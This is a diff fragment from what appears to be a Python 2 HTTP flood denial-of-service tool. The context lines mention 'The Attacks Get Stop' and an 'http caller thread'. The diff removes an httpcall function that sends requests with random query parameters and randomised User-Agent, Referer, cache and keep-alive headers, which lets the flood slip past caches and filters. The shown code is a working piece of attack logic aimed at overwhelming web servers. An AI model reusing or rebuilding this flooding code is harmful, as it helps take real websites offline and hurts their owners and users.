@@ -242,38 +242,6 @@ class MonitorThread(threading.Thread):
 			print "\n ~>The Attacks Get Stop<~"
 
 			
-			
-			
-def httpcall(url):
-	useragent_list()
-	referer_list()
-	code=0
-	if url.count("?")>0:
-		param_joiner="&"
-	else:
-		param_joiner="?"
-	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
-	request.add_header('User-Agent', random.choice(headers_useragents))
-	request.add_header('Cache-Control', 'no-cache')
-	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
-	request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5,10)))
-	request.add_header('Keep-Alive', random.randint(110,120))
-	request.add_header('Connection', 'keep-alive')
-	request.add_header('Host',host)
-	try:
-			urllib2.urlopen(request)
-	except urllib2.HTTPError, e:
-			#print e.code
-			
-			code=500
-	except urllib2.URLError, e:
-			#print e.reason
-			sys.exit()
-	else:
-			inc_counter()
-			urllib2.urlopen(request)
-	return(code)		
-
 	
 #http caller thread 
 class HTTPThread(threading.Thread):
